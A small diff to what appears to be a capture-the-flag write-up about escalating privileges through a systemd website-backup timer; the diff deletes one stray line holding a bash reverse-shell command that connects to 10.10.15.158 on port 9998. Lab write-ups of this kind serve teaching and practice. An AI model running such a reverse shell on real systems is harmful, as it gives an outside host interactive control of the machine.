@@ -549,7 +549,6 @@ Description=Creates backups of the website
 ExecStart=/bin/bash /usr/bin/timer_backup.sh
 ```
 So here we can see the script is indeed getting ran using this timer, and the other timer is being used to ensure this timer remains running.
-bash -i &> /dev/tcp/10.10.15.158/9998 0>&1
 
 ### 5. Escalate to root
 ```bash
